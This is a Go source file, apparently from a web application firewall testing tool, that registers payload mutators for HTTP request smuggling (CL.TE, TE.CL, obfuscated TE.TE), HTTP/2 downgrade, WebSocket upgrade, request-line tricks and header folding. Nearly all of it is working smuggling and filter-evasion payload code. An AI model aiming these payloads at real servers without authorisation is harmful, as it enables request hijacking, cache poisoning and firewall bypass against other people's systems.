// Package protocol provides protocol-level attack plugins.
// Integrates with existing smuggling and hpp packages.
package protocol

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/waftester/waftester/pkg/mutation"
)

func init() {
	// Register protocol-level mutators
	protocols := []mutation.Mutator{
		&HTTPSmugglingCLTE{},
		&HTTPSmugglingTECL{},
		&HTTPSmugglingTETE{},
		&HTTP2Downgrade{},
		&WebSocketUpgrade{},
		&RequestLineMutator{},
		&HeaderFolding{},
		&TransferEncodingObfuscation{},
	}

	for _, p := range protocols {
		mutation.Register(p)
	}
}

// =============================================================================
// HTTP SMUGGLING - CL.TE
// =============================================================================

type HTTPSmugglingCLTE struct{}

func (p *HTTPSmugglingCLTE) Name() string        { return "smuggle_clte" }
func (p *HTTPSmugglingCLTE) Category() string    { return "protocol" }
func (p *HTTPSmugglingCLTE) Description() string { return "CL.TE HTTP request smuggling" }

func (p *HTTPSmugglingCLTE) Mutate(payload string) []mutation.MutatedPayload {
	results := make([]mutation.MutatedPayload, 0, 3)

	// Basic CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
	// Send Content-Length that covers partial chunked body
	clteBasic := fmt.Sprintf("Content-Length: 6\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"0\r\n"+
		"\r\n"+
		"G%s", payload)
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     clteBasic,
		MutatorName: p.Name() + "_basic",
		Category:    p.Category(),
	})

	// CL.TE with smuggled request
	smuggledReq := fmt.Sprintf("Content-Length: 40\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"0\r\n"+
		"\r\n"+
		"GET /?x=%s HTTP/1.1\r\n"+
		"Foo: x", url.QueryEscape(payload))
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     smuggledReq,
		MutatorName: p.Name() + "_smuggle",
		Category:    p.Category(),
	})

	// CL.TE timing attack probe
	timingProbe := fmt.Sprintf("Content-Length: 4\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"1\r\n"+
		"%s\r\n"+
		"Q", payload[:1])
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     timingProbe,
		MutatorName: p.Name() + "_timing",
		Category:    p.Category(),
	})

	return results
}

// =============================================================================
// HTTP SMUGGLING - TE.CL
// =============================================================================

type HTTPSmugglingTECL struct{}

func (p *HTTPSmugglingTECL) Name() string        { return "smuggle_tecl" }
func (p *HTTPSmugglingTECL) Category() string    { return "protocol" }
func (p *HTTPSmugglingTECL) Description() string { return "TE.CL HTTP request smuggling" }

func (p *HTTPSmugglingTECL) Mutate(payload string) []mutation.MutatedPayload {
	results := make([]mutation.MutatedPayload, 0, 2)

	// Basic TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
	teclBasic := fmt.Sprintf("Content-Length: 3\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"8\r\n"+
		"SMUGGLED%s\r\n"+
		"0\r\n"+
		"\r\n", payload)
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     teclBasic,
		MutatorName: p.Name() + "_basic",
		Category:    p.Category(),
	})

	// TE.CL with request prefix
	teclPrefix := fmt.Sprintf("Content-Length: 4\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"5c\r\n"+
		"GPOST / HTTP/1.1\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 15\r\n"+
		"\r\n"+
		"x=%s\r\n"+
		"0\r\n"+
		"\r\n", url.QueryEscape(payload))
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     teclPrefix,
		MutatorName: p.Name() + "_prefix",
		Category:    p.Category(),
	})

	return results
}

// =============================================================================
// HTTP SMUGGLING - TE.TE (Obfuscated)
// =============================================================================

type HTTPSmugglingTETE struct{}

func (p *HTTPSmugglingTETE) Name() string        { return "smuggle_tete" }
func (p *HTTPSmugglingTETE) Category() string    { return "protocol" }
func (p *HTTPSmugglingTETE) Description() string { return "TE.TE HTTP smuggling with obfuscation" }

func (p *HTTPSmugglingTETE) Mutate(payload string) []mutation.MutatedPayload {
	results := make([]mutation.MutatedPayload, 0, 8)

	// Various Transfer-Encoding obfuscations
	teVariants := []struct {
		name   string
		header string
	}{
		{"space_before", "Transfer-Encoding : chunked"},
		{"space_after", "Transfer-Encoding: chunked "},
		{"tab", "Transfer-Encoding:\tchunked"},
		{"newline", "Transfer-Encoding\r\n : chunked"},
		{"case", "Transfer-Encoding: Chunked"},
		{"double", "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"},
		{"comma", "Transfer-Encoding: chunked, identity"},
		{"quoted", "Transfer-Encoding: \"chunked\""},
		{"xchunked", "X-Transfer-Encoding: chunked"},
	}

	for _, variant := range teVariants {
		obfuscated := fmt.Sprintf("Content-Length: 4\r\n"+
			"%s\r\n"+
			"\r\n"+
			"5\r\n"+
			"%s\r\n"+
			"0\r\n"+
			"\r\n", variant.header, payload)
		results = append(results, mutation.MutatedPayload{
			Original:    payload,
			Mutated:     obfuscated,
			MutatorName: p.Name() + "_" + variant.name,
			Category:    p.Category(),
		})
	}

	return results
}

// =============================================================================
// HTTP/2 DOWNGRADE
// =============================================================================

type HTTP2Downgrade struct{}

func (p *HTTP2Downgrade) Name() string        { return "h2_downgrade" }
func (p *HTTP2Downgrade) Category() string    { return "protocol" }
func (p *HTTP2Downgrade) Description() string { return "HTTP/2 to HTTP/1.1 downgrade attacks" }

func (p *HTTP2Downgrade) Mutate(payload string) []mutation.MutatedPayload {
	results := make([]mutation.MutatedPayload, 0, 4)

	// H2.CL - HTTP/2 with Content-Length manipulation
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf(":method: POST\r\n:path: /?%s\r\ncontent-length: 0\r\n\r\n", url.QueryEscape(payload)),
		MutatorName: p.Name() + "_h2cl",
		Category:    p.Category(),
	})

	// H2.TE - HTTP/2 with Transfer-Encoding (should be stripped)
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf(":method: POST\r\n:path: /\r\ntransfer-encoding: chunked\r\n\r\n1\r\n%s\r\n0\r\n\r\n", payload[:1]),
		MutatorName: p.Name() + "_h2te",
		Category:    p.Category(),
	})

	// HTTP/2 header injection via line folding
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf(":path: /\r\n foo: bar\r\n%s", payload),
		MutatorName: p.Name() + "_fold",
		Category:    p.Category(),
	})

	return results
}

// =============================================================================
// WEBSOCKET UPGRADE
// =============================================================================

type WebSocketUpgrade struct{}

func (p *WebSocketUpgrade) Name() string        { return "websocket" }
func (p *WebSocketUpgrade) Category() string    { return "protocol" }
func (p *WebSocketUpgrade) Description() string { return "WebSocket upgrade smuggling" }

func (p *WebSocketUpgrade) Mutate(payload string) []mutation.MutatedPayload {
	results := make([]mutation.MutatedPayload, 0, 2)

	// WebSocket handshake with payload in path
	wsHandshake := fmt.Sprintf("GET /%s HTTP/1.1\r\n"+
		"Host: target.com\r\n"+
		"Upgrade: websocket\r\n"+
		"Connection: Upgrade\r\n"+
		"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"+
		"Sec-WebSocket-Version: 13\r\n"+
		"\r\n", url.PathEscape(payload))
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     wsHandshake,
		MutatorName: p.Name() + "_path",
		Category:    p.Category(),
	})

	// WebSocket with payload in custom header
	wsHeader := fmt.Sprintf("GET / HTTP/1.1\r\n"+
		"Host: target.com\r\n"+
		"Upgrade: websocket\r\n"+
		"Connection: Upgrade\r\n"+
		"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"+
		"Sec-WebSocket-Version: 13\r\n"+
		"X-Custom: %s\r\n"+
		"\r\n", payload)
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     wsHeader,
		MutatorName: p.Name() + "_header",
		Category:    p.Category(),
	})

	return results
}

// =============================================================================
// REQUEST LINE MANIPULATION
// =============================================================================

type RequestLineMutator struct{}

func (p *RequestLineMutator) Name() string        { return "request_line" }
func (p *RequestLineMutator) Category() string    { return "protocol" }
func (p *RequestLineMutator) Description() string { return "HTTP request line manipulation" }

func (p *RequestLineMutator) Mutate(payload string) []mutation.MutatedPayload {
	results := make([]mutation.MutatedPayload, 0, 6)
	escaped := url.PathEscape(payload)

	// Absolute URL in request line
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf("GET http://target.com/%s HTTP/1.1", escaped),
		MutatorName: p.Name() + "_absolute",
		Category:    p.Category(),
	})

	// Different HTTP versions
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf("GET /%s HTTP/1.0", escaped),
		MutatorName: p.Name() + "_http10",
		Category:    p.Category(),
	})

	// HTTP/0.9 style (no version)
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf("GET /%s", escaped),
		MutatorName: p.Name() + "_http09",
		Category:    p.Category(),
	})

	// Tab instead of space
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf("GET\t/%s\tHTTP/1.1", escaped),
		MutatorName: p.Name() + "_tab",
		Category:    p.Category(),
	})

	// Multiple slashes
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf("GET ///%s HTTP/1.1", escaped),
		MutatorName: p.Name() + "_slashes",
		Category:    p.Category(),
	})

	// Case variation in method
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf("gEt /%s HTTP/1.1", escaped),
		MutatorName: p.Name() + "_case",
		Category:    p.Category(),
	})

	return results
}

// =============================================================================
// HEADER FOLDING
// =============================================================================

type HeaderFolding struct{}

func (p *HeaderFolding) Name() string        { return "header_fold" }
func (p *HeaderFolding) Category() string    { return "protocol" }
func (p *HeaderFolding) Description() string { return "HTTP header folding/continuation" }

func (p *HeaderFolding) Mutate(payload string) []mutation.MutatedPayload {
	results := make([]mutation.MutatedPayload, 0, 4)

	// Space continuation
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf("X-Custom: part1\r\n %s", payload),
		MutatorName: p.Name() + "_space",
		Category:    p.Category(),
	})

	// Tab continuation
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     fmt.Sprintf("X-Custom: part1\r\n\t%s", payload),
		MutatorName: p.Name() + "_tab",
		Category:    p.Category(),
	})

	// Multi-line
	parts := splitIntoChunks(payload, 5)
	var multiline strings.Builder
	multiline.WriteString("X-Custom: ")
	for i, part := range parts {
		if i > 0 {
			multiline.WriteString("\r\n ")
		}
		multiline.WriteString(part)
	}
	results = append(results, mutation.MutatedPayload{
		Original:    payload,
		Mutated:     multiline.String(),
		MutatorName: p.Name() + "_multiline",
		Category:    p.Category(),
	})

	return results
}

// =============================================================================
// TRANSFER-ENCODING OBFUSCATION
// =============================================================================

type TransferEncodingObfuscation struct{}

func (p *TransferEncodingObfuscation) Name() string     { return "te_obfuscate" }
func (p *TransferEncodingObfuscation) Category() string { return "protocol" }
func (p *TransferEncodingObfuscation) Description() string {
	return "Transfer-Encoding header obfuscation techniques"
}

func (p *TransferEncodingObfuscation) Mutate(payload string) []mutation.MutatedPayload {
	results := make([]mutation.MutatedPayload, 0, 12)

	obfuscations := []struct {
		name  string
		value string
	}{
		{"chunked_space", "chunked "},
		{"chunked_tab", "chunked\t"},
		{"chunked_vtab", "chunked\x0b"},
		{"xchunked", "xchunked"},
		{"chunked_null", "chunked\x00"},
		{"chunked_comma", "chunked,"},
		{"identity_chunked", "identity, chunked"},
		{"chunked_identity", "chunked, identity"},
		{"Chunked", "Chunked"},
		{"CHUNKED", "CHUNKED"},
		{"chunkeD", "chunkeD"},
	}

	for _, obf := range obfuscations {
		body := fmt.Sprintf("Transfer-Encoding: %s\r\n"+
			"\r\n"+
			"%x\r\n"+
			"%s\r\n"+
			"0\r\n"+
			"\r\n", obf.value, len(payload), payload)
		results = append(results, mutation.MutatedPayload{
			Original:    payload,
			Mutated:     body,
			MutatorName: p.Name() + "_" + obf.name,
			Category:    p.Category(),
		})
	}

	return results
}

// Helper function to split string into chunks
func splitIntoChunks(s string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}
